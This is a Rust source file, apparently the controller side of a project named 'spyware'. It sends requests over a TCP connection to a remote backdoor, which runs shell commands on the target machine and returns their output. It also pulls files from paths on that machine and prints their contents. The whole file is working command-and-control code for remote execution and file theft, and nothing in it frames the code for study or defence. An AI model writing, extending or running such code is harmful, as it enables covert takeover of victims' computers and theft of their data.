use serde::Serialize;
use spyware::communication::messages::{
    DownloadFileResponse, ErrorInfo, MessageType, MessageTypes, RunCommandRequest,
    RunCommandResponse,
};
use std::io::{Error, Write};
use std::net::TcpStream;

use spyware::communication::messages::DownloadFileRequest;
use spyware::communication::serialization::serialize_message;
use spyware::communication::server::get_message;

pub fn send_request(
    req: impl Serialize + MessageType,
    stream: &mut TcpStream,
) -> Result<(), Error> {
    let msg = serialize_message(req).unwrap();

    println!("Sending buffer {:?}", msg);
    stream
        .write_all(&msg)
        .expect("Could not write data to stream");
    println!("Sent message, awaiting reply...");
    Ok(())
}

pub fn run_command(
    command: String,
    stream: &mut TcpStream,
) -> Result<RunCommandResponse, ErrorInfo> {
    println!("Running command {} through backdoor.", command);
    let req = RunCommandRequest {
        command,
        async_run: false,
    };
    send_request(req, stream).expect("Could not send request");

    let response = get_message(&stream).expect("Could not get message from stream");
    if response.message_type != MessageTypes::RunCommandResponse as u8 {
        panic!(format!(
            "Got unexpected response type {}",
            response.message_type
        ));
    }
    println!("Response got: {:?}", response);
    let response: RunCommandResponse =
        ron::de::from_bytes(&response.serialized_message).expect("Could not deserialize message");
    println!("Output: {:?} ", &response.output);
    println!("Error info: {:?}", response.error_info);

    if response.error_info.is_none() {
        Ok(response)
    } else {
        Err(response.error_info.unwrap())
    }
}

pub fn download_file(remote_path: String, _local_path: String, stream: &mut TcpStream) {
    let req = DownloadFileRequest { path: remote_path };
    send_request(req, stream).expect("Could not send request");

    let response = get_message(&stream).expect("Could not get message from stream");
    if response.message_type != MessageTypes::DownloadFileResponse as u8 {
        panic!(format!(
            "Got unexpected response type {}",
            response.message_type
        ));
    }
    let response: DownloadFileResponse =
        ron::de::from_bytes(&response.serialized_message).expect("Could not deserialize message");
    println!(
        "File data: {}",
        std::str::from_utf8(&response.file_data).unwrap()
    );
    println!("Error info: {:?}", response.error_info);
}
